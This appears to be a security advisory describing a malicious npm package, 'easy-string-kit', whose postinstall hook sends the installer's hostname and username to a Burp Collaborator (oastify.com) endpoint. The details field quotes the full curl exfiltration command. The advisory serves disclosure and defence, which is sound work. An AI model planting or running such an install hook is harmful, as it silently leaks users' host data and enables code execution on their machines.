summary: Postinstall hook exfiltrates host identity to attacker-controlled OAST endpoint
details: package.json declares a postinstall lifecycle script that runs `curl http://v405xonelk29rwduta7eqn2w8nee2cq1.oastify.com/pre?h=$(hostname)&u=$(whoami)` on `npm install`. This auto-executes on default install and sends the installer machine's hostname and current username, over plain HTTP, to a Burp Suite Collaborator (oastify.com) subdomain — a service routinely used to confirm out-of-band code execution against a target. The package advertises itself as a string utility, but ships no functional library code worth the network call; metadata fields (author, repository.url, homepage, bugs.url) are empty placeholders, consistent with a throwaway package whose sole purpose is the exfiltration callback. Installer impact: any machine running `npm install easy-string-kit` discloses host identity to an attacker-controlled endpoint and demonstrates arbitrary-command execution under the install user's privileges.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
